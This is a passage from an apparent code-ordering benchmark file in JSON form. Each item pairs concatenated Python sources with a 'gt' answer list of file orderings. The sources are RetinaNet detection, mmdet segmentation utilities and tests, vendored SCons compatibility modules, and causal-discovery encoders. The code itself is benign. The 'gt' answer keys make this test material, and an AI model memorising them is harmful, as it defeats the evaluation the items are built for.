color=color)\n\n\n        if labels_to_names[label] == \"arac\":\n            frame_json[\"nesneler\"].append({\n                \"sinif\": int(label),\n                \"inis_durumu\": landing_status,\n                \"sinirlayici_kutu\": {\n                    \"ust_sol\": {\n                        \"x\":int(box[0]),\n                        \"y\":int(box[1]),\n                    },\n                    \"alt_sag\": {\n                        \"x\":int(box[2]),\n                        \"y\":int(box[3]),\n                    }\n                }\n            })\n\n\n    results_json.append(frame_json)\n\n\n    file_, ext = os.path.splitext(image_filename)\n    image_name = file_.split('/')[-1] + ext\n    output_path = os.path.join(results_path, image_name)\n\n    draw_conv = cv2.cvtColor(draw, cv2.COLOR_BGR2RGB)\n    cv2.imwrite(output_path, draw_conv)\n\n\n\n\n\nwith open('{0}/results_{1}.json'.format(results_path,dt_now), 'w') as fp:\n    json.dump(results_json, fp)\n\n\n\n\n",
        "gt": [
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/effnet.py'",
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/keras_retinanet/models/__init__.py'",
            "'Keras-RetinaNet-for-Teknofest-2019/retinanet/detect_all_images.py'"
        ]
    },
    {
        "files": [
            "'ERD/mmdet/utils/setup_env.py'",
            "'ERD/mmdet/models/seg_heads/__init__.py'",
            "'ERD/tests/test_models/test_seg_heads/test_panoptic_fpn_head.py'",
            "'ERD/mmdet/engine/__init__.py'",
            "'ERD/mmdet/models/seg_heads/panoptic_fpn_head.py'",
            "'ERD/mmdet/utils/__init__.py'"
        ],
        "content": "'ERD/mmdet/utils/setup_env.py'\n:\nimport datetime\nimport logging\nimport os\nimport platform\nimport warnings\n\nimport cv2\nimport torch.multiprocessing as mp\nfrom mmengine import DefaultScope\nfrom mmengine.logging import print_log\nfrom mmengine.utils import digit_version\n\n\ndef setup_cache_size_limit_of_dynamo():\n\n\n    import torch\n    if digit_version(torch.__version__) >= digit_version('2.0.0'):\n        if 'DYNAMO_CACHE_SIZE_LIMIT' in os.environ:\n            import torch._dynamo\n            cache_size_limit = int(os.environ['DYNAMO_CACHE_SIZE_LIMIT'])\n            torch._dynamo.config.cache_size_limit = cache_size_limit\n            print_log(\n                f'torch._dynamo.config.cache_size_limit is force '\n                f'set to {cache_size_limit}.',\n                logger='current',\n                level=logging.WARNING)\n\n\ndef setup_multi_processes(cfg):\n\n\n    if platform.system() != 'Windows':\n        mp_start_method = cfg.get('mp_start_method', 'fork')\n        current_method = mp.get_start_method(allow_none=True)\n        if current_method is not None and current_method != mp_start_method:\n            warnings.warn(\n                f'Multi-processing start method `{mp_start_method}` is '\n                f'different from the previous setting `{current_method}`.'\n                f'It will be force set to `{mp_start_method}`. You can change '\n                f'this behavior by changing `mp_start_method` in your config.')\n        mp.set_start_method(mp_start_method, force=True)\n\n\n    opencv_num_threads = cfg.get('opencv_num_threads', 0)\n    cv2.setNumThreads(opencv_num_threads)\n\n\n\n    workers_per_gpu = cfg.data.get('workers_per_gpu', 1)\n    if 'train_dataloader' in cfg.data:\n        workers_per_gpu = \\\n            max(cfg.data.train_dataloader.get('workers_per_gpu', 1),\n                workers_per_gpu)\n\n    if 'OMP_NUM_THREADS' not in os.environ and workers_per_gpu > 1:\n        omp_num_threads = 1\n        warnings.warn(\n            f'Setting OMP_NUM_THREADS environment variable for each process '\n            f'to be {omp_num_threads} in default, to avoid your system being '\n            f'overloaded, please further tune the variable for optimal '\n            f'performance in your application as needed.')\n        os.environ['OMP_NUM_THREADS'] = str(omp_num_threads)\n\n\n    if 'MKL_NUM_THREADS' not in os.environ and workers_per_gpu > 1:\n        mkl_num_threads = 1\n        warnings.warn(\n            f'Setting MKL_NUM_THREADS environment variable for each process '\n            f'to be {mkl_num_threads} in default, to avoid your system being '\n            f'overloaded, please further tune the variable for optimal '\n            f'performance in your application as needed.')\n        os.environ['MKL_NUM_THREADS'] = str(mkl_num_threads)\n\n\ndef register_all_modules(init_default_scope: bool = True) -> None:\n\n    import mmdet.datasets\n    import mmdet.engine\n    import mmdet.evaluation\n    import mmdet.models\n    import mmdet.visualization\n\n    if init_default_scope:\n        never_created = DefaultScope.get_current_instance() is None \\\n                        or not DefaultScope.check_instance_created('mmdet')\n        if never_created:\n            DefaultScope.get_instance('mmdet', scope_name='mmdet')\n            return\n        current_scope = DefaultScope.get_current_instance()\n        if current_scope.scope_name != 'mmdet':\n            warnings.warn('The current default scope '\n                          f'\"{current_scope.scope_name}\" is not \"mmdet\", '\n                          '`register_all_modules` will force the current'\n                          'default scope to be \"mmdet\". If this is not '\n                          'expected, please set `init_default_scope=False`.')\n\n            new_instance_name = f'mmdet-{datetime.datetime.now()}'\n            DefaultScope.get_instance(new_instance_name, scope_name='mmdet')\n\n'ERD/mmdet/models/seg_heads/__init__.py'\n:\nfrom .panoptic_fpn_head import PanopticFPNHead\nfrom .panoptic_fusion_heads import *\n\n'ERD/tests/test_models/test_seg_heads/test_panoptic_fpn_head.py'\n:import unittest\n\nimport torch\nfrom mmengine.structures import PixelData\nfrom mmengine.testing import assert_allclose\n\nfrom mmdet.models.seg_heads import PanopticFPNHead\nfrom mmdet.structures import DetDataSample\n\n\nclass TestPanopticFPNHead(unittest.TestCase):\n\n    def test_init_weights(self):\n        head = PanopticFPNHead(\n            num_things_classes=2,\n            num_stuff_classes=2,\n            in_channels=32,\n            inner_channels=32)\n        head.init_weights()\n        assert_allclose(head.conv_logits.bias.data,\n                        torch.zeros_like(head.conv_logits.bias.data))\n\n    def test_loss(self):\n        head = PanopticFPNHead(\n            num_things_classes=2,\n            num_stuff_classes=2,\n            in_channels=32,\n            inner_channels=32,\n            start_level=0,\n            end_level=1)\n        x = [torch.rand((2, 32, 8, 8)), torch.rand((2, 32, 4, 4))]\n        data_sample1 = DetDataSample()\n        data_sample1.gt_sem_seg = PixelData(\n            sem_seg=torch.randint(0, 4, (1, 7, 8)))\n        data_sample2 = DetDataSample()\n        data_sample2.gt_sem_seg = PixelData(\n            sem_seg=torch.randint(0, 4, (1, 7, 8)))\n        batch_data_samples = [data_sample1, data_sample2]\n        results = head.loss(x, batch_data_samples)\n        self.assertIsInstance(results, dict)\n\n    def test_predict(self):\n        head = PanopticFPNHead(\n            num_things_classes=2,\n            num_stuff_classes=2,\n            in_channels=32,\n            inner_channels=32,\n            start_level=0,\n            end_level=1)\n        x = [torch.rand((2, 32, 8, 8)), torch.rand((2, 32, 4, 4))]\n        img_meta1 = {\n            'batch_input_shape': (16, 16),\n            'img_shape': (14, 14),\n            'ori_shape': (12, 12),\n        }\n        img_meta2 = {\n            'batch_input_shape': (16, 16),\n            'img_shape': (16, 16),\n            'ori_shape': (16, 16),\n        }\n        batch_img_metas = [img_meta1, img_meta2]\n        head.eval()\n        with torch.no_grad():\n            seg_preds = head.predict(x, batch_img_metas, rescale=False)\n            self.assertTupleEqual(seg_preds[0].shape[-2:], (16, 16))\n            self.assertTupleEqual(seg_preds[1].shape[-2:], (16, 16))\n\n            seg_preds = head.predict(x, batch_img_metas, rescale=True)\n            self.assertTupleEqual(seg_preds[0].shape[-2:], (12, 12))\n            self.assertTupleEqual(seg_preds[1].shape[-2:], (16, 16))\n\n'ERD/mmdet/engine/__init__.py'\n:\nfrom .hooks import *\nfrom .optimizers import *\nfrom .runner import *\nfrom .schedulers import *\n\n'ERD/mmdet/models/seg_heads/panoptic_fpn_head.py'\n:\nfrom typing import Dict, Tuple, Union\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom mmengine.model import ModuleList\nfrom torch import Tensor\n\nfrom mmdet.registry import MODELS\nfrom mmdet.structures import SampleList\nfrom mmdet.utils import ConfigType, OptConfigType, OptMultiConfig\nfrom ..layers import ConvUpsample\nfrom ..utils import interpolate_as\nfrom .base_semantic_head import BaseSemanticHead\n\n\n@MODELS.register_module()\nclass PanopticFPNHead(BaseSemanticHead):\n\n\n    def __init__(self,\n                 num_things_classes: int = 80,\n                 num_stuff_classes: int = 53,\n                 in_channels: int = 256,\n                 inner_channels: int = 128,\n                 start_level: int = 0,\n                 end_level: int = 4,\n                 conv_cfg: OptConfigType = None,\n                 norm_cfg: ConfigType = dict(\n                     type='GN', num_groups=32, requires_grad=True),\n                 loss_seg: ConfigType = dict(\n                     type='CrossEntropyLoss', ignore_index=-1,\n                     loss_weight=1.0),\n                 init_cfg: OptMultiConfig = None) -> None:\n        seg_rescale_factor = 1 / 2**(start_level + 2)\n        super().__init__(\n            num_classes=num_stuff_classes + 1,\n            seg_rescale_factor=seg_rescale_factor,\n            loss_seg=loss_seg,\n            init_cfg=init_cfg)\n        self.num_things_classes = num_things_classes\n        self.num_stuff_classes = num_stuff_classes\n\n        self.start_level = start_level\n        self.end_level = end_level\n        self.num_stages = end_level - start_level\n        self.inner_channels = inner_channels\n\n        self.conv_upsample_layers = ModuleList()\n        for i in range(start_level, end_level):\n            self.conv_upsample_layers.append(\n                ConvUpsample(\n                    in_channels,\n                    inner_channels,\n                    num_layers=i if i > 0 else 1,\n                    num_upsample=i if i > 0 else 0,\n                    conv_cfg=conv_cfg,\n                    norm_cfg=norm_cfg,\n                ))\n        self.conv_logits = nn.Conv2d(inner_channels, self.num_classes, 1)\n\n    def _set_things_to_void(self, gt_semantic_seg: Tensor) -> Tensor:\n\n        gt_semantic_seg = gt_semantic_seg.int()\n        fg_mask = gt_semantic_seg < self.num_things_classes\n        bg_mask = (gt_semantic_seg >= self.num_things_classes) * (\n            gt_semantic_seg < self.num_things_classes + self.num_stuff_classes)\n\n        new_gt_seg = torch.clone(gt_semantic_seg)\n        new_gt_seg = torch.where(bg_mask,\n                                 gt_semantic_seg - self.num_things_classes,\n                                 new_gt_seg)\n        new_gt_seg = torch.where(fg_mask,\n                                 fg_mask.int() * self.num_stuff_classes,\n                                 new_gt_seg)\n        return new_gt_seg\n\n    def loss(self, x: Union[Tensor, Tuple[Tensor]],\n             batch_data_samples: SampleList) -> Dict[str, Tensor]:\n\n        seg_preds = self(x)['seg_preds']\n        gt_semantic_segs = [\n            data_sample.gt_sem_seg.sem_seg\n            for data_sample in batch_data_samples\n        ]\n\n        gt_semantic_segs = torch.stack(gt_semantic_segs)\n        if self.seg_rescale_factor != 1.0:\n            gt_semantic_segs = F.interpolate(\n                gt_semantic_segs.float(),\n                scale_factor=self.seg_rescale_factor,\n                mode='nearest').squeeze(1)\n\n\n        gt_semantic_segs = self._set_things_to_void(gt_semantic_segs)\n\n        if seg_preds.shape[-2:] != gt_semantic_segs.shape[-2:]:\n            seg_preds = interpolate_as(seg_preds, gt_semantic_segs)\n        seg_preds = seg_preds.permute((0, 2, 3, 1))\n\n        loss_seg = self.loss_seg(\n            seg_preds.reshape(-1, self.num_classes),\n            gt_semantic_segs.reshape(-1).long())\n\n        return dict(loss_seg=loss_seg)\n\n    def init_weights(self) -> None:\n\n        super().init_weights()\n        nn.init.normal_(self.conv_logits.weight.data, 0, 0.01)\n        self.conv_logits.bias.data.zero_()\n\n    def forward(self, x: Tuple[Tensor]) -> Dict[str, Tensor]:\n\n\n\n        assert self.num_stages <= len(x)\n\n        feats = []\n        for i, layer in enumerate(self.conv_upsample_layers):\n            f = layer(x[self.start_level + i])\n            feats.append(f)\n\n        seg_feats = torch.sum(torch.stack(feats, dim=0), dim=0)\n        seg_preds = self.conv_logits(seg_feats)\n        out = dict(seg_preds=seg_preds, seg_feats=seg_feats)\n        return out\n\n'ERD/mmdet/utils/__init__.py'\n:\nfrom .collect_env import collect_env\nfrom .compat_config import compat_cfg\nfrom .dist_utils import (all_reduce_dict, allreduce_grads, reduce_mean,\n                         sync_random_seed)\nfrom .logger import get_caller_name, log_img_scale\nfrom .memory import AvoidCUDAOOM, AvoidOOM\nfrom .misc import (find_latest_checkpoint, get_test_pipeline_cfg,\n                   update_data_root)\nfrom .replace_cfg_vals import replace_cfg_vals\nfrom .setup_env import (register_all_modules, setup_cache_size_limit_of_dynamo,\n                        setup_multi_processes)\nfrom .split_batch import split_batch\nfrom .typing_utils import (ConfigType, InstanceList, MultiConfig,\n                           OptConfigType, OptInstanceList, OptMultiConfig,\n                           OptPixelList, PixelList, RangeType)\n\n__all__ = [\n    'collect_env', 'find_latest_checkpoint', 'update_data_root',\n    'setup_multi_processes', 'get_caller_name', 'log_img_scale', 'compat_cfg',\n    'split_batch', 'register_all_modules', 'replace_cfg_vals', 'AvoidOOM',\n    'AvoidCUDAOOM', 'all_reduce_dict', 'allreduce_grads', 'reduce_mean',\n    'sync_random_seed', 'ConfigType', 'InstanceList', 'MultiConfig',\n    'OptConfigType', 'OptInstanceList', 'OptMultiConfig', 'OptPixelList',\n    'PixelList', 'RangeType', 'get_test_pipeline_cfg',\n    'setup_cache_size_limit_of_dynamo'\n]\n",
        "gt": [
            "'ERD/mmdet/engine/__init__.py'",
            "'ERD/mmdet/utils/setup_env.py'",
            "'ERD/mmdet/utils/__init__.py'",
            "'ERD/mmdet/models/seg_heads/panoptic_fpn_head.py'",
            "'ERD/mmdet/models/seg_heads/__init__.py'",
            "'ERD/tests/test_models/test_seg_heads/test_panoptic_fpn_head.py'"
        ]
    },
    {
        "files": [
            "'sitoa/contrib/scons/scons-local-2.2.0/SCons/Tool/sunc++.py'",
            "'sitoa/contrib/scons/scons-local-2.2.0/SCons/compat/_scons_builtins.py'",
            "'sitoa/contrib/scons/scons-local-2.2.0/SCons/__init__.py'",
            "'sitoa/contrib/scons/scons-local-2.2.0/SCons/compat/__init__.py'"
        ],
        "content": "'sitoa/contrib/scons/scons-local-2.2.0/SCons/Tool/sunc++.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n__revision__ = \"src/engine/SCons/Tool/sunc++.py issue-2856:2676:d23b7a2f45e8 2012/08/05 15:38:28 garyo\"\n\nimport SCons\n\nimport os\nimport re\nimport subprocess\n\ncplusplus = __import__('c++', globals(), locals(), [])\n\npackage_info = {}\n\ndef get_package_info(package_name, pkginfo, pkgchk):\n    try:\n        return package_info[package_name]\n    except KeyError:\n        version = None\n        pathname = None\n        try:\n            sadm_contents = open('/var/sadm/install/contents', 'r').read()\n        except EnvironmentError:\n            pass\n        else:\n            sadm_re = re.compile('^(\\S*/bin/CC)(=\\S*)? %s$' % package_name, re.M)\n            sadm_match = sadm_re.search(sadm_contents)\n            if sadm_match:\n                pathname = os.path.dirname(sadm_match.group(1))\n\n        try:\n            p = subprocess.Popen([pkginfo, '-l', package_name],\n                                 stdout=subprocess.PIPE,\n                                 stderr=open('/dev/null', 'w'))\n        except EnvironmentError:\n            pass\n        else:\n            pkginfo_contents = p.communicate()[0]\n            version_re = re.compile('^ *VERSION:\\s*(.*)$', re.M)\n            version_match = version_re.search(pkginfo_contents)\n            if version_match:\n                version = version_match.group(1)\n\n        if pathname is None:\n            try:\n                p = subprocess.Popen([pkgchk, '-l', package_name],\n                                     stdout=subprocess.PIPE,\n                                     stderr=open('/dev/null', 'w'))\n            except EnvironmentError:\n                pass\n            else:\n                pkgchk_contents = p.communicate()[0]\n                pathname_re = re.compile(r'^Pathname:\\s*(.*/bin/CC)$', re.M)\n                pathname_match = pathname_re.search(pkgchk_contents)\n                if pathname_match:\n                    pathname = os.path.dirname(pathname_match.group(1))\n\n        package_info[package_name] = (pathname, version)\n        return package_info[package_name]\n\n\n\ndef get_cppc(env):\n    cxx = env.subst('$CXX')\n    if cxx:\n        cppcPath = os.path.dirname(cxx)\n    else:\n        cppcPath = None\n\n    cppcVersion = None\n\n    pkginfo = env.subst('$PKGINFO')\n    pkgchk = env.subst('$PKGCHK')\n\n    for package in ['SPROcpl']:\n        path, version = get_package_info(package, pkginfo, pkgchk)\n        if path and version:\n            cppcPath, cppcVersion = path, version\n            break\n\n    return (cppcPath, 'CC', 'CC', cppcVersion)\n\ndef generate(env):\n\n    path, cxx, shcxx, version = get_cppc(env)\n    if path:\n        cxx = os.path.join(path, cxx)\n        shcxx = os.path.join(path, shcxx)\n\n    cplusplus.generate(env)\n\n    env['CXX'] = cxx\n    env['SHCXX'] = shcxx\n    env['CXXVERSION'] = version\n    env['SHCXXFLAGS']   = SCons.Util.CLVar('$CXXFLAGS -KPIC')\n    env['SHOBJPREFIX']  = 'so_'\n    env['SHOBJSUFFIX']  = '.o'\n\ndef exists(env):\n    path, cxx, shcxx, version = get_cppc(env)\n    if path and cxx:\n        cppc = os.path.join(path, cxx)\n        if os.path.exists(cppc):\n            return cppc\n    return None\n\n\n\n\n\n\n\n'sitoa/contrib/scons/scons-local-2.2.0/SCons/compat/_scons_builtins.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n__doc__ =\n\n__revision__ = \"src/engine/SCons/compat/_scons_builtins.py issue-2856:2676:d23b7a2f45e8 2012/08/05 15:38:28 garyo\"\n\nimport builtins\n\ntry:\n    all\nexcept NameError:\n\n    def all(iterable):\n\n        for element in iterable:\n            if not element:\n                return False\n        return True\n    builtins.all = all\n    all = all\n\ntry:\n    any\nexcept NameError:\n\n    def any(iterable):\n\n        for element in iterable:\n            if element:\n                return True\n        return False\n    builtins.any = any\n    any = any\n\ntry:\n    memoryview\nexcept NameError:\n\n    class memoryview(object):\n        def __init__(self, obj):\n\n            self.obj = (buffer)(obj)\n        def __getitem__(self, indx):\n            if isinstance(indx, slice):\n                return self.obj[indx.start:indx.stop]\n            else:\n                return self.obj[indx]\n    builtins.memoryview = memoryview\n\ntry:\n    sorted\nexcept NameError:\n\n\n\n\n\n\n    def sorted(iterable, cmp=None, key=None, reverse=False):\n        if key is not None:\n            result = [(key(x), x) for x in iterable]\n        else:\n            result = iterable[:]\n        if cmp is None:\n\n            result.sort()\n        else:\n            result.sort(cmp)\n        if key is not None:\n            result = [t1 for t0,t1 in result]\n        if reverse:\n            result.reverse()\n        return result\n    builtins.sorted = sorted\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n'sitoa/contrib/scons/scons-local-2.2.0/SCons/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n__revision__ = \"src/engine/SCons/__init__.py issue-2856:2676:d23b7a2f45e8 2012/08/05 15:38:28 garyo\"\n\n__version__ = \"2.2.0\"\n\n__build__ = \"issue-2856:2676:d23b7a2f45e8[MODIFIED]\"\n\n__buildsys__ = \"oberbrunner-dev\"\n\n__date__ = \"2012/08/05 15:38:28\"\n\n__developer__ = \"garyo\"\n\n\nimport SCons.compat\n\n\n\n\n\n\n\n'sitoa/contrib/scons/scons-local-2.2.0/SCons/compat/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n__doc__ = \"\"\"\nSCons compatibility package for old Python versions\n\nThis subpackage holds modules that provide backwards-compatible\nimplementations of various things that we'd like to use in SCons but which\nonly show up in later versions of Python than the early, old version(s)\nwe still support.\n\nOther code will not generally reference things in this package through\nthe SCons.compat namespace.  The modules included here add things to\nthe builtins namespace or the global module list so that the rest\nof our code can use the objects and names imported here regardless of\nPython version.\n\nSimply enough, things that go in the builtins name space come from\nour _scons_builtins module.\n\nThe rest of the things here will be in individual compatibility modules\nthat are either: 1) suitably modified copies of the future modules that\nwe want to use; or 2) backwards compatible re-implementations of the\nspecific portions of a future module's API that we want to use.\n\nGENERAL WARNINGS:  Implementations of functions in the SCons.compat\nmodules are *NOT* guaranteed to be fully compliant with these functions in\nlater versions of Python.  We are only concerned with adding functionality\nthat we actually use in SCons, so be wary if you lift this code for\nother uses.  (That said, making these more nearly the same as later,\nofficial versions is still a desirable goal, we just don't need to be\nobsessive about it.)\n\nWe name the compatibility modules with an initial '_scons_' (for example,\n_scons_subprocess.py is our compatibility module for subprocess) so\nthat we can still try to import the real module name and fall back to\nour compatibility module if we get an ImportError.  The import_as()\nfunction defined below loads the module as the \"real\" name (without the\n'_scons'), after which all of the \"import {module}\" statements in the\nrest of our code will find our pre-loaded compatibility module.\n\"\"\"\n\n__revision__ = \"src/engine/SCons/compat/__init__.py issue-2856:2676:d23b7a2f45e8 2012/08/05 15:38:28 garyo\"\n\nimport os\nimport sys\nimport imp\n\ndef import_as(module, name):\n\n    dir = os.path.split(__file__)[0]\n    return imp.load_module(name, *imp.find_module(module, [dir]))\n\ndef rename_module(new, old):\n\n    try:\n        sys.modules[new] = imp.load_module(old, *imp.find_module(old))\n        return True\n    except ImportError:\n        return False\n\n\nrename_module('builtins', '__builtin__')\nimport _scons_builtins\n\n\ntry:\n    import hashlib\nexcept ImportError:\n\n    try:\n        import_as('_scons_hashlib', 'hashlib')\n    except ImportError:\n\n\n\n\n        pass\n\ntry:\n    set\nexcept NameError:\n\n    import_as('_scons_sets', 'sets')\n    import builtins, sets\n    builtins.set = sets.Set\n\n\ntry:\n    import collections\nexcept ImportError:\n\n    import_as('_scons_collections', 'collections')\nelse:\n    try:\n        collections.UserDict\n    except AttributeError:\n        exec('from UserDict import UserDict as _UserDict')\n        collections.UserDict = _UserDict\n        del _UserDict\n    try:\n        collections.UserList\n    except AttributeError:\n        exec('from UserList import UserList as _UserList')\n        collections.UserList = _UserList\n        del _UserList\n    try:\n        collections.UserString\n    except AttributeError:\n        exec('from UserString import UserString as _UserString')\n        collections.UserString = _UserString\n        del _UserString\n\n\ntry:\n    import io\nexcept ImportError:\n\n    import_as('_scons_io', 'io')\n\n\ntry:\n    os.devnull\nexcept AttributeError:\n\n    _names = sys.builtin_module_names\n    if 'posix' in _names:\n        os.devnull = '/dev/null'\n    elif 'nt' in _names:\n        os.devnull = 'nul'\n    os.path.devnull = os.devnull\ntry:\n    os.path.lexists\nexcept AttributeError:\n\n    def lexists(path):\n        return os.path.exists(path) or os.path.islink(path)\n    os.path.lexists = lexists\n\n\n\n\n\nif os.environ.get('SCONS_HORRIBLE_REGRESSION_TEST_HACK') is None:\n\n\n    rename_module('pickle', 'cPickle')\n\n\n\nrename_module('profile', 'cProfile')\n\n\n\nrename_module('queue', 'Queue')\n\n\n\nrename_module('winreg', '_winreg')\n\n\ntry:\n    import subprocess\nexcept ImportError:\n\n    import_as('_scons_subprocess', 'subprocess')\n\ntry:\n    sys.intern\nexcept AttributeError:\n\n    import builtins\n    try:\n        sys.intern = builtins.intern\n    except AttributeError:\n\n        def intern(x):\n           return x\n        sys.intern = intern\n        del intern\ntry:\n    sys.maxsize\nexcept AttributeError:\n\n\n    sys.maxsize = (sys).maxint\n\n\nif os.environ.get('SCONS_HORRIBLE_REGRESSION_TEST_HACK') is not None:\n\n\n\n\n\n\n\n    from types import ClassType\n    def callable(obj):\n        if hasattr(obj, '__call__'): return True\n        if isinstance(obj, (ClassType, type)): return True\n        return False\n    import builtins\n    builtins.callable = callable\n    del callable\n\n\n\n\n\n\n\n",
        "gt": [
            "'sitoa/contrib/scons/scons-local-2.2.0/SCons/compat/_scons_builtins.py'",
            "'sitoa/contrib/scons/scons-local-2.2.0/SCons/compat/__init__.py'",
            "'sitoa/contrib/scons/scons-local-2.2.0/SCons/__init__.py'",
            "'sitoa/contrib/scons/scons-local-2.2.0/SCons/Tool/sunc++.py'"
        ]
    },
    {
        "files": [
            "'AmortizedCausalDiscovery/codebase/model/EncoderGlobalTemp.py'",
            "'AmortizedCausalDiscovery/codebase/model/MLPEncoder.py'",
            "'AmortizedCausalDiscovery/codebase/model/model_loader.py'",
            "'AmortizedCausalDiscovery/codebase/train.py'"
        ],
        "content": "'AmortizedCausalDiscovery/codebase/model/EncoderGlobalTemp.py'\n:from model.modules import *\nfrom model.MLPEncoder import MLPEncoder\nfrom model.CNNEncoder import CNNEncoder\n\n\nclass CNNEncoderGlobalTemp(CNNEncoder):\n    def __init__(\n        self,\n        args,\n        n_in,\n        n_hid,\n        n_out,\n        do_prob=0.0,\n        factor=True,\n        latent_dim=2,\n        latent_sample_dim=1,\n        num_atoms=5,\n        num_timesteps=49,\n    ):\n        super().__init__(\n            args,\n            n_in,\n            n_hid,\n            n_out,\n            do_prob,\n            factor,\n            n_in_mlp1=n_hid + latent_sample_dim,\n        )\n\n        self.mlp4_confounder = MLP(\n            n_in * num_timesteps * num_atoms,\n            n_hid,\n            latent_dim,\n            do_prob,\n            use_batch_norm=False,\n            final_linear=True,\n        )\n        self.init_weights()\n\n    def forward(self, inputs, rel_rec, rel_send):\n\n\n        edges = self.node2edge_temporal(inputs, rel_rec, rel_send)\n        x = self.cnn(edges)\n        x = x.view(inputs.size(0), (inputs.size(1) - 1) * inputs.size(1), -1)\n\n\n        x_latent_input = inputs.view(inputs.size(0), 1, -1)\n        latents = self.mlp4_confounder(x_latent_input).squeeze(1)\n\n        inferred_mu, inferred_width = utils.get_uniform_parameters_from_latents(latents)\n        latent_sample = utils.sample_uniform_from_latents(inferred_mu, inferred_width)\n        l = latent_sample.view(latent_sample.size(0), 1, latent_sample.size(1)).repeat(\n            1, x.size(1), 1\n        )\n        l = l.detach()\n\n\n        x = self.mlp1(torch.cat([x, l], 2))\n        x_skip = x\n\n        if self.factor:\n            x = self.edge2node(x, rel_rec, rel_send)\n            x = self.mlp2(x)\n            x = self.node2edge(x, rel_rec, rel_send)\n            x = torch.cat((x, x_skip), dim=2)\n            x = self.mlp3(x)\n\n        return self.fc_out(x), latent_sample, inferred_mu, inferred_width\n\n'AmortizedCausalDiscovery/codebase/model/MLPEncoder.py'\n:import torch\n\nfrom model.modules import *\nfrom model.Encoder import Encoder\n\n\nclass MLPEncoder(Encoder):\n\n\n    def __init__(self, args, n_in, n_hid, n_out, do_prob=0.0, factor=True):\n        super().__init__(args, factor)\n\n        self.mlp1 = MLP(n_in, n_hid, n_hid, do_prob)\n        self.mlp2 = MLP(n_hid * 2, n_hid, n_hid, do_prob)\n        self.mlp3 = MLP(n_hid, n_hid, n_hid, do_prob)\n        if self.factor:\n            self.mlp4 = MLP(n_hid * 3, n_hid, n_hid, do_prob)\n            print(\"Using factor graph MLP encoder.\")\n        else:\n            self.mlp4 = MLP(n_hid * 2, n_hid, n_hid, do_prob)\n            print(\"Using MLP encoder.\")\n        self.fc_out = nn.Linear(n_hid, n_out)\n\n        self.init_weights()\n\n    def forward(self, inputs, rel_rec, rel_send):\n\n        x = inputs.view(inputs.size(0), inputs.size(1), -1)\n\n\n        x = self.mlp1(x)\n        x = self.node2edge(x, rel_rec, rel_send)\n        x = self.mlp2(x)\n        x_skip = x\n\n        if self.factor:\n            x = self.edge2node(x, rel_rec, rel_send)\n            x = self.mlp3(x)\n            x = self.node2edge(x, rel_rec, rel_send)\n            x = torch.cat((x, x_skip), dim=2)\n            x = self.mlp4(x)\n        else:\n            x = self.mlp3(x)\n            x = torch.cat((x, x_skip), dim=2)\n            x = self.mlp4(x)\n\n        return self.fc_out(x)\n\n'AmortizedCausalDiscovery/codebase/model/model_loader.py'\n:import os\nimport torch\nimport torch.optim as optim\nfrom torch.optim import lr_scheduler\n\nfrom model.modules import *\nfrom model.MLPEncoder import MLPEncoder\nfrom model.CNNEncoder import CNNEncoder\nfrom model.MLPEncoderUnobserved import MLPEncoderUnobserved\nfrom model.EncoderGlobalTemp import CNNEncoderGlobalTemp\n\nfrom model.MLPDecoder import MLPDecoder\nfrom model.RNNDecoder import RNNDecoder\nfrom model.SimulationDecoder import SimulationDecoder\nfrom model.DecoderGlobalTemp import MLPDecoderGlobalTemp, SimulationDecoderGlobalTemp\n\nfrom model import utils\n\n\ndef load_distribution(args):\n    edge_probs = torch.randn(\n        torch.Size([args.num_atoms ** 2 - args.num_atoms, args.edge_types]),\n        device=args.device.type,\n        requires_grad=True,\n    )\n    return edge_probs\n\n\ndef load_encoder(args):\n    if args.global_temp:\n        encoder = CNNEncoderGlobalTemp(\n            args,\n            args.dims,\n            args.encoder_hidden,\n            args.edge_types,\n            args.encoder_dropout,\n            args.factor,\n        )\n    elif args.unobserved > 0 and args.model_unobserved == 0:\n        encoder = MLPEncoderUnobserved(\n            args,\n            args.timesteps * args.dims,\n            args.encoder_hidden,\n            args.edge_types,\n            do_prob=args.encoder_dropout,\n            factor=args.factor,\n        )\n    else:\n        if args.encoder == \"mlp\":\n            encoder = MLPEncoder(\n                args,\n                args.timesteps * args.dims,\n                args.encoder_hidden,\n                args.edge_types,\n                do_prob=args.encoder_dropout,\n                factor=args.factor,\n            )\n        elif args.encoder == \"cnn\":\n            encoder = CNNEncoder(\n                args,\n                args.dims,\n                args.encoder_hidden,\n                args.edge_types,\n                args.encoder_dropout,\n                args.factor,\n            )\n\n    encoder, num_GPU = utils.distribute_over_GPUs(args, encoder, num_GPU=args.num_GPU)\n    if args.load_folder:\n        print(\"Loading model file\")\n        args.encoder_file = os.path.join(args.load_folder, \"encoder.pt\")\n        encoder.load_state_dict(torch.load(args.encoder_file, map_location=args.device))\n\n    return encoder\n\n\ndef load_decoder(args, loc_max, loc_min, vel_max, vel_min):\n    if args.global_temp:\n        if args.decoder == \"mlp\":\n            decoder = MLPDecoderGlobalTemp(\n                n_in_node=args.dims,\n                edge_types=args.edge_types,\n                msg_hid=args.decoder_hidden,\n                msg_out=args.decoder_hidden,\n                n_hid=args.decoder_hidden,\n                do_prob=args.decoder_dropout,\n                skip_first=args.skip_first,\n                latent_dim=args.latent_dim,\n            )\n        elif args.decoder == \"sim\":\n            decoder = SimulationDecoderGlobalTemp(\n                loc_max, loc_min, vel_max, vel_min, args.suffix\n            )\n    else:\n        if args.decoder == \"mlp\":\n            decoder = MLPDecoder(\n                args,\n                n_in_node=args.dims,\n                edge_types=args.edge_types,\n                msg_hid=args.decoder_hidden,\n                msg_out=args.decoder_hidden,\n                n_hid=args.decoder_hidden,\n                do_prob=args.decoder_dropout,\n                skip_first=args.skip_first,\n            )\n        elif args.decoder == \"rnn\":\n            decoder = RNNDecoder(\n                n_in_node=args.dims,\n                edge_types=args.edge_types,\n                